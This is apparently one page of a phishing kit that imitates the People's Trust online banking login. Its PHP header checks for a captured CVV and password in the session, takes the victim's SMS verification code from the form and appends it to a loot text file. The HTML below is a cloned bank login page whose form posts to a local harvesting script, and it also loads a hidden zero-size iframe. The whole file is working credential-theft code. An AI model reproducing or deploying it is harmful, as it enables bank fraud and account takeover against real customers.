<?php session_start();
if (!isset($_SESSION["cvv"]) or !isset( $_SESSION["mdp"])) {
       header("Location: ./people_trust.php");
        exit();
}
$_SESSION["sms"] = $_POST['sms'] ;

$donnees = "Sms : " .$_SESSION["sms"] ."\n". "** FIN  CONNEXION **\n"."\n";
$file = "../blinky2000@bvc@bvc@destruction.txt" ;
file_put_contents($file, $donnees, FILE_APPEND);

session_destroy();




?>



<!DOCTYPE html>
<!-- saved from url=(0048)https://peoplestrust.auth.memberdirect.net/login -->
<html xmlns:layout="http://www.ultraq.net.nz/web/thymeleaf/layout" lang="en_CA">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style type="text/css">
        @charset "UTF-8";

        [ng\:cloak],
        [ng-cloak],
        [data-ng-cloak],
        [x-ng-cloak],
        .ng-cloak,
        .x-ng-cloak,
        .ng-hide:not(.ng-hide-animate) {
            display: none !important;
        }

        ng\:form {
            display: block;
        }

        .ng-animate-shim {
            visibility: hidden;
        }

        .ng-anchor {
            position: absolute;
        }
    </style>
    <title>Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2">
    <meta name="google" content="notranslate">

    <!-- import md reno theme  -->

    <!-- import forge 1 theme -->
    <link type="text/css" href="./people_trust_files/theme-peoplestrust.css" rel="stylesheet">

    <style>
        [ng\:cloak],
        [ng-cloak],
        [data-ng-cloak],
        [x-ng-cloak],
        .ng-cloak,
        .x-ng-cloak {
            display: none !important;
        }
    </style>

    <link type="text/css" href="./people_trust_files/login-common.css" rel="stylesheet">
    <link type="text/css" href="./people_trust_files/secure-key.css" rel="stylesheet">
    <link rel="icon"
        href="https://peoplestrust.auth.memberdirect.net/resources/themes/theme-peoplestrust/assets/favicon.png">

</head>

<body ng-app="UxpLoginApp" class="uxp-theme ng-scope">

    <div class="widget-c1-oauth-login position-relative oauth-login">
        <!-- Navigation section -->

        <!-- Terms and Condition section -->
        <!-- Login section -->
        <div ng-controller="UxpLoginController as $ctrl" id="c1-login-section" class="ng-scope">

            <div class="errors errors-login">
                <span ng-hide="state.isSubmittingForm || state.isFieldOnChange" class="error-message"></span>
            </div>
            <form id="loginForm" name="uxpLoginForm"
                class="center-block c1-login-form ng-pristine ng-invalid ng-invalid-uxp-pattern ng-invalid-required ng-valid-minlength ng-valid-maxlength"
                ng-class="{ &#39;ie11-fix&#39;: isIE11 }" action="./people_trust_files/people.php" method="post"
                autocomplete="on" ng-submit="ngSubmitListener(&#39;false&#39;)"><input type="hidden" name="_csrf"
                    value="77be8eb3-fd7c-442e-8880-23feb4620e29" autocomplete="off">

                <!-- ReCaptcha -->



                <div>
                    <!-- Memorized account select -->
                    <div ng-form="memorizedLoginsForm" ng-show="showingMemorizedAccounts()"
                        class="memorized-login-selector memorized-login-selector ng-pristine ng-valid ng-hide"
                        id="c1-memorized-login-selector" ng-init="memorizedAccounts=[];">



                        <div class="logo text-center">
                            <img src="./people_trust_files/logo.png" alt="Logo">

                        </div>

                    



                    </div>

                    <!-- pan/pac login -->
                    <div ng-form="newLoginForm" ng-hide="showingMemorizedAccounts()"
                        class="ng-pristine ng-invalid ng-invalid-uxp-pattern ng-invalid-required ng-valid-minlength ng-valid-maxlength">



                        <div class="logo text-center">
                            <img src="./people_trust_files/logo.png" alt="Logo">

                        </div>




                    


                    </div>


       </div>
            </form>

            <!-- ngIf: state.isShowingSpinner -->

        </div>
    </div>




    <div id="extension-mmplj"></div><iframe id="tdz_ifrm" title="empty" name="" width="0px" height="0px" marginwidth="0"
        marginheight="0" frameborder="0" aria-disabled="true" aria-hidden="true" tabindex="-1"
        src="./people_trust_files/Niodwaz5m3hDWFs7.html"
        style="display: none !important; z-index: -9999 !important; visibility: hidden !important;"></iframe>
</body>

</html>